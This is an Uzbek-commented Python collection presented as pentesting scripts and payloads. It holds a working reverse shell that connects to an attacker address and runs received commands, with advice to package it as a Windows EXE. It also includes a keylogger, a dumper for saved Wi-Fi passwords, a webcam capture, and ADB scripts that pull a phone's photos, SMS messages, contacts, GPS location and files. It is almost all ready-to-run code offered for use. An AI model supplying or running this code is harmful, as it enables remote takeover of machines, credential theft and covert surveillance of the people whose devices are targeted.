# Pentesting uchun Python orqali ishlatiladigan ba'zi foydali scriptlar va payloadlar:

# 1. Reverse Shell (Windows va Linux uchun)
# Bu payload jabrlanuvchi qurilmadan sizga ulanishni yo'lga qo'yadi.


import socket
import subprocess

IP = "YOUR_IP_ADDRESS"
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

while True:
    command = s.recv(1024).decode("utf-8")
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
# ✅ Buni EXE faylga o'zgartirib, Windows-da ishlatish mumkin.

# 2. Keylogger (Foydalanuvchining klaviaturasini yozib borish)

from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
# ✅ Bu skript klaviaturadan kiritilgan harflarni "log.txt" ga yozib boradi.

# 3. Wi-Fi Passwordlarni Olish (Windows uchun)

import subprocess

wifi_list = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
profiles = [line.split(":")[1].strip() for line in wifi_list.split("\n") if "All User Profile" in line]

for profile in profiles:
    wifi_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode()
    if "Key Content" in wifi_info:
        password_line = [line for line in wifi_info.split("\n") if "Key Content" in line][0]
        password = password_line.split(":")[1].strip()
        print(f"WiFi: {profile}, Password: {password}")
# ✅ Bu skript Windows tizimidagi Wi-Fi profillarini va ularning parollarini chiqaradi.

# 4. Android Telefonidan Ma'lumotlarni Olish (ADB orqali)

import os

def pull_android_files():
    os.system("adb devices")
    os.system("adb shell ls /sdcard/")
    os.system("adb pull /sdcard/DCIM/ my_photos")

pull_android_files()
# ✅ Bu skript ADB orqali telefon xotirasidan ma'lumotlarni kompyuterga olish uchun ishlatiladi.

# ----------------------------------------------------------------------------

# 1. Kamera orqali rasm olish (Android va Windows)
# ✅ Bu kod qurilmaning kamerasidan rasm olishga imkon beradi.

# Windows (OpenCV yordamida)

import cv2

cam = cv2.VideoCapture(0)
ret, frame = cam.read()

if ret:
    cv2.imwrite("captured_image.jpg", frame)

cam.release()

# Android (ADB yordamida)

import os

def capture_android_photo():
    os.system("adb shell input keyevent 27")  # Kamera tugmachasini bosish
    os.system("adb pull /sdcard/DCIM/Camera/ my_pictures")  # Olingan rasmni olish

capture_android_photo()


# 2. GPS ma'lumotlarini olish (Android)
# ✅ GPS joylashuvni olish uchun "termux-api" yoki "adb shell" ni ishlatish mumkin.
import os

def get_gps_location():
    gps_data = os.popen("adb shell dumpsys location").read()
    print(gps_data)

get_gps_location()
# 💡 GPS faqat telefon sozlamalarida yoqilgan bo'lsa ishlaydi.


# 3. SMS xabarlarni olish (Android)
# ✅ Android telefonidan SMSlarni olish uchun "ADB shell" dan foydalaniladi.

import os

def get_sms():
    sms_data = os.popen("adb shell content query --uri content://sms/").read()
    print(sms_data)

get_sms()

# 4. Fayllarni olish (Android va Windows)
# Windows
import os
import shutil

def copy_files():
    source = "C:\\Users\\YourUser\\Documents"
    destination = "C:\\Users\\YourUser\\Backup"
    
    if not os.path.exists(destination):
        os.makedirs(destination)

    for file_name in os.listdir(source):
        full_file_name = os.path.join(source, file_name)
        if os.path.isfile(full_file_name):
            shutil.copy(full_file_name, destination)

copy_files()

# Android (ADB orqali)

import os

def get_android_files():
    os.system("adb pull /sdcard/Download/ my_downloads")

get_android_files()

# 5. Kontaktlarni olish (Android)
# ✅ Telefon ichidagi kontaktlarni olish uchun "ADB shell" dan foydalanish mumkin.


import os

def get_contacts():
    contacts_data = os.popen("adb shell content query --uri content://contacts/phones/").read()
    print(contacts_data)

get_contacts()